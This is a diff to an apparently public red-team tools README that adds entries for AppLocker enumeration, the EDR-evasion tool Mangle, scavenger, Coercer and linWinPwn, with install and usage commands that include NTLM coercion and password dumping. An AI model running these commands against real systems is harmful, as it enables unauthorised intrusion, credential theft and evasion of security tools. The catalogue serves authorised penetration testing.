@@ -4,7 +4,7 @@
 <img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
 </p>
 
-This github repository contains a collection of **110+** **tools** and **resources** that can be useful for **red teaming activities**. 
+This github repository contains a collection of **115+** **tools** and **resources** that can be useful for **red teaming activities**. 
 
 Some of the tools may be specifically designed for red teaming, while others are more general-purpose and can be adapted for use in a red teaming context.
 
@@ -23,7 +23,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 # Tool List
 
 <details open>
-    <summary><b>Red Team Tips</b> $\textcolor{gray}{\text{12 tips}}$</summary>
+    <summary><b>Red Team Tips</b> $\textcolor{gray}{\text{13 tips}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#hiding-the-local-admin-account">Hiding the local admin account</a></b><i> @Alh4zr3d</i></li>
@@ -38,6 +38,7 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#bypass-a-disabled-command-prompt-with-k">Bypass a disabled command prompt with /k</a></b><i> Martin Sohn Christensen</i></li>
             <li><b><a href="#stop-windows-defender-deleting-mimikatzexe">Stop windows defender deleting mimikatz.exe</a></b><i> @GuhnooPlusLinux</i></li>
             <li><b><a href="#check-if-you-are-in-a-virtual-machine">Check if you are in a virtual machine</a></b><i> @dmcxblue</i></li>
+            <li><b><a href="#enumerate-applocker-rules">Enumerate AppLocker rules</a></b><i> @Alh4zr3d</i></li>
         </ul>
     </ul>        
 </details>
@@ -146,13 +147,14 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{4 tools}}$</summary>
+    <summary><b>Defense Evasion</b> $\textcolor{gray}{\text{5 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#invoke-obfuscation">Invoke-Obfuscation</a></b><i> Script obfuscator</i></li>
-	    <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
+	        <li><b><a href="#veil">Veil</a></b><i> Metasploit payload obfuscator</i></li>
             <li><b><a href="#sharpblock">SharpBlock</a></b><i> EDR bypass via entry point execution prevention</i></li>
             <li><b><a href="#alcatraz">Alcatraz</a></b><i> GUI x64 binary obfuscator</i></li>
+            <li><b><a href="#mangle">Mangle</a></b><i> Compiled executable manipulation</i></li>
         </ul>
     </ul>
 </details>
@@ -174,7 +176,7 @@ Some of the tools may be specifically designed for red teaming, while others are
 </details>
 
 <details open>
-    <summary><b>Discovery</b> $\textcolor{gray}{\text{5 tools}}$</summary>
+    <summary><b>Discovery</b> $\textcolor{gray}{\text{6 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#pcredz">PCredz</a></b><i> Credential discovery PCAP/live interface</i></li>
@@ -182,12 +184,13 @@ Some of the tools may be specifically designed for red teaming, while others are
     	    <li><b><a href="#seatbelt">Seatbelt</a></b><i> Local vulnerability scanner</i></li>
     	    <li><b><a href="#adrecon">ADRecon</a></b><i> Active directory recon</i></li>
     	    <li><b><a href="#adidnsdump">adidnsdump</a></b><i> Active Directory Integrated DNS dumping</i></li>
+    	    <li><b><a href="#scavenger">scavenger</a></b><i> Scanning tool for scavenging systems</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{11 tools}}$</summary>
+    <summary><b>Lateral Movement</b> $\textcolor{gray}{\text{12 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#crackmapexec">crackmapexec</a></b><i> Windows/Active directory lateral movement toolkit</i></li>
@@ -201,16 +204,18 @@ Some of the tools may be specifically designed for red teaming, while others are
             <li><b><a href="#jenkins-reverse-shell">Jenkins reverse shell</a></b><i> Jenkins shell command</i></li>
             <li><b><a href="#adfspoof">ADFSpoof</a></b><i> Forge AD FS security tokens</i></li>
             <li><b><a href="#kerbrute">kerbrute</a></b><i> A tool to perform Kerberos pre-auth bruteforcing</i></li>
+            <li><b><a href="#coercer">Coercer</a></b><i> Coerce a Windows server to authenticate</i></li>
         </ul>
     </ul>
 </details>
 
 <details open>
-    <summary><b>Collection</b> $\textcolor{gray}{\text{2 tools}}$</summary>
+    <summary><b>Collection</b> $\textcolor{gray}{\text{3 tools}}$</summary>
     <ul>
         <ul>
             <li><b><a href="#bloodhound">BloodHound</a></b><i> Active directory visualisation</i></li>
             <li><b><a href="#snaffler">Snaffler</a></b><i> Active directory credential collector</i></li>
+            <li><b><a href="#linwinpwn">linWinPwn</a></b><i> Active Directory Enumeration and Vulnerability checks</i></li>
         </ul>
     </ul>
 </details>
@@ -403,6 +408,22 @@ reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
 **Credit:** [@dmcxblue](https://twitter.com/dmcxblue)
 
 **Link:** [Twitter](https://twitter.com/dmcxblue/status/1366779034672136194)
+
+### [🔙](#tool-list)Enumerate AppLocker rules
+
+```
+(Get-AppLockerPolicy -Local).RuleCollections
+
+Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
+
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
+```
+
+**Description:** *'AppLocker can be a pain. Enumerate to see how painful'*
+
+**Credit:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)
+
+**Link:** [Twitter](https://twitter.com/alh4zr3d/status/1614706476412698624)
 
 Reconnaissance
 ====================
@@ -2257,6 +2278,50 @@ Using the GUI to obfuscate a binary:
 
 *Image used from https://github.com/weak1337/Alcatraz*
 
+### [🔙](#tool-list)[Mangle](https://github.com/optiv/Mangle)
+
+Mangle is a tool that manipulates aspects of compiled executables (.exe or DLL). 
+
+Mangle can remove known Indicators of Compromise (IoC) based strings and replace them with random characters, change the file by inflating the size to avoid EDRs, and can clone code-signing certs from legitimate files. 
+
+In doing so, Mangle helps loaders evade on-disk and in-memory scanners.
+
+**Install:** 
+
+The first step, as always, is to clone the repo. Before you compile Mangle, you'll need to install the dependencies. To install them, run the following commands:
+
+```
+go get github.com/Binject/debug/pe
+```
+
+Then build it
+
+```
+git clone https://github.com/optiv/Mangle
+cd Mangle
+go build Mangle.go
+```
+
+**Usage:** 
+
+```bash
+  -C string
+        Path to the file containing the certificate you want to clone
+  -I string
+        Path to the orginal file
+  -M    Edit the PE file to strip out Go indicators
+  -O string
+        The new file name
+  -S int
+        How many MBs to increase the file by
+```
+
+Full usage information can be found [here](https://github.com/optiv/Mangle#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/216736894-ce46ac43-52b8-42bd-9f03-5d7656a635ff.png)
+
+*Image used from https://github.com/optiv/Mangle*
+
 Credential Access
 ====================
 
@@ -2703,6 +2768,34 @@ make all
 
 *Image used from https://matthewomccorkle.github.io/day_032_kerbrute/*
 
+### [🔙](#tool-list)[scavenger](https://github.com/SpiderLabs/scavenger)
+
+Scavenger is a multi-threaded post-exploitation scanning tool for scavenging systems, finding most frequently used files and folders as well as "interesting" files containing sensitive information.
+
+Scavenger confronts a challenging issue typically faced by Penetration Testing consultants during internal penetration tests; the issue of having too much access to too many systems with limited days for testing.
+
+**Install:** 
+
+First install CrackMapExec from [here](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation).
+
+```bash
+git clone https://github.com/SpiderLabs/scavenger
+cd scavenger
+```
+
+**Usage:** 
+
+```bash
+# Search for interesting files on victim endpoint
+python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
+```
+
+Nice [blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/).
+
+![image](https://user-images.githubusercontent.com/100603074/216736914-e7a7fe26-3531-4ae1-9962-fce130d8ab62.png)
+
+*Image used from https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/scavenger-post-exploitation-tool-for-collecting-vital-data/*
+
 Lateral Movement
 ====================
 
@@ -2989,6 +3082,43 @@ Additional command examples can be found [here](https://github.com/mandiant/ADFS
 
 *Image used from https://github.com/mandiant/ADFSpoof#usage*
 
+### [🔙](#tool-list)[Coercer](https://github.com/p0dalirius/Coercer)
+
+A python script to automatically coerce a Windows server to authenticate on an arbitrary machine through many methods.
+
+Features:
+
+- Lists open SMB pipes on the remote machine (in modes scan authenticated and fuzz authenticated)
+-  Tries to connect on a list of known SMB pipes on the remote machine (in modes scan unauthenticated and fuzz unauthenticated)
+-  Calls one by one all the vulnerable RPC functions to coerce the server to authenticate on an arbitrary machine.
+-  Random UNC paths generation to avoid caching failed attempts (all modes)
+-  Configurable delay between attempts with --delay
+
+More feature information [here](https://github.com/p0dalirius/Coercer#features).
+
+**Install: (pip)** 
+
+```bash
+sudo python3 -m pip install coercer
+```
+
+**Usage:** 
+
+```bash
+# Scan mode (Assess the Remote Procedure Calls listening on a machine)
+./Coercer.py scan -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+
+# Coerce mode (Exploit the Remote Procedure Calls on a remote machine to coerce an authentication to ntlmrelay or responder)
+./Coercer.py coerce -l 192.168.1.2 -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+
+# Fuzz mode (Fuzz Remote Procedure Calls listening on a machine)
+./Coercer.py fuzz -t 192.168.1.1 -u 'username' -p 'password' -d test.locl -v
+```
+
+![image](https://user-images.githubusercontent.com/100603074/216737001-3195a6c4-3d41-431d-88ce-ed35ed474d33.png)
+
+*Image used from https://github.com/p0dalirius/Coercer#quick-start*
+
 Collection
 ====================
 
@@ -3029,6 +3159,45 @@ snaffler.exe -s -o snaffler.log
 ![image](https://user-images.githubusercontent.com/100603074/210266420-a658a48e-2945-4d06-9aff-e3fb14664829.png)
 
 *Image used from https://github.com/SnaffCon/Snaffler#what-does-it-look-like*
+
+### [🔙](#tool-list)[linWinPwn](https://github.com/lefayjey/linWinPwn)
+
+linWinPwn is a bash script that automates a number of Active Directory Enumeration and Vulnerability checks. 
+
+The script uses a number of tools and serves as wrapper of them. Tools include: impacket, bloodhound, crackmapexec, enum4linux-ng, ldapdomaindump, lsassy, smbmap, kerbrute, adidnsdump, certipy, silenthound, and others.
+
+linWinPwn is particularly useful when you have access to an Active Directory environment for a limited time only, and you wish to automate the enumeration process and collect evidence efficiently.
+
+**Install:** 
+
+```bash
+git clone https://github.com/lefayjey/linWinPwn
+cd linWinPwn; chmod +x linWinPwn.sh
+chmod +x install.sh
+./install.sh
+```
+
+**Usage:** 
+
+```bash
+# Default: interactive - Open interactive menu to run checks separately
+./linWinPwn.sh -t <Domain_Controller_IP> [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
+
+# Auto config - Run NTP sync with target DC and add entry to /etc/hosts before running the modules
+./linWinPwn.sh -t <Domain_Controller_IP> --auto-config
+
+# LDAPS - Use LDAPS instead of LDAP (port 636)
+./linWinPwn.sh -t <Domain_Controller_IP> --ldaps
+
+# Module pwd_dump: Password Dump
+./linWinPwn.sh -t <Domain_Controller_IP> -M pwd_dump [-d <AD_domain> -u <AD_user> -p <AD_password_or_hash[LM:NT]_or_kerbticket[./krb5cc_ticket]> -o <output_dir>]
+```
+
+Full usage information [here](https://github.com/lefayjey/linWinPwn#usage).
+
+![image](https://user-images.githubusercontent.com/100603074/216737032-57ceff01-2606-474d-a745-b39fb4997ea1.png)
+
+*Image used from https://github.com/lefayjey/linWinPwn#demos*
 
 Command and Control
 ====================
